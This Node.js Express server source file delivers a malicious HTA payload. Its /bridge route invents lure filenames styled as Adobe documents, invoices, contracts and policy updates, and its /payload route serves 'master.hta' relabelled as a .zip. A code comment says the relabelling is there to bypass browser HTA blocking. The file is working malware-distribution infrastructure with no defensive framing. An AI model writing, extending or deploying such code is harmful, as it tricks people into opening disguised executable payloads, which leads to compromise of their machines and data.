const express = require('express');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const port = process.env.PORT || 3000;

// ✅ CRITICAL: Define DYNAMIC routes BEFORE static middleware
// This ensures /payload/:filename is caught by our handler, not the static server

// 1. THE BRIDGE
app.get('/bridge', (req, res) => {
    const randomId = crypto.randomInt(100000, 999999);
    const themes = ['Adobe_Document', 'Contract_Agreement', 'Invoice_Scan', 'Policy_Update', 'Secure_Form'];
    const theme = themes[Math.floor(Math.random() * themes.length)];
    const uniqueName = `${theme}_${randomId}.hta`;
    
    // Redirect to confirm page with encoded filename
    res.redirect(`/confirm.html?file=${encodeURIComponent(uniqueName)}`);
});

// 2. THE PAYLOAD ENDPOINT - MUST BE BEFORE express.static
app.get('/payload/:filename', (req, res) => {
    const filePath = path.join(__dirname, 'public', 'master.hta');
    
    // Debug logging - CHECK YOUR RAILWAY LOGS FOR THIS
    console.log(`[PAYLOAD] Requested: ${req.params.filename}`);
    console.log(`[PAYLOAD] Serving from: ${filePath}`);
    console.log(`[PAYLOAD] File exists: ${fs.existsSync(filePath)}`);
    
    if (!fs.existsSync(filePath)) {
        console.error(`[PAYLOAD] ERROR: master.hta not found at ${filePath}`);
        return res.status(404).send('Payload source file missing.');
    }

    // Serve as .zip to bypass browser HTA blocking
    const safeFilename = req.params.filename.replace('.hta', '.zip');
    
    res.setHeader('Content-Disposition', `attachment; filename="${safeFilename}"`);
    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    
    res.sendFile(filePath, (err) => {
        if (err) {
            console.error(`[PAYLOAD] Send error: ${err.message}`);
            if (!res.headersSent) res.status(500).send('Download failed.');
        } else {
            console.log(`[PAYLOAD] Successfully sent: ${safeFilename}`);
        }
    });
});

// 3. STATIC FILES - MUST BE AFTER dynamic routes
app.use(express.static('public'));

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.listen(port, () => {
    console.log(`✅ Server running on port ${port}`);
    console.log(` Test: http://localhost:${port}/bridge`);
});
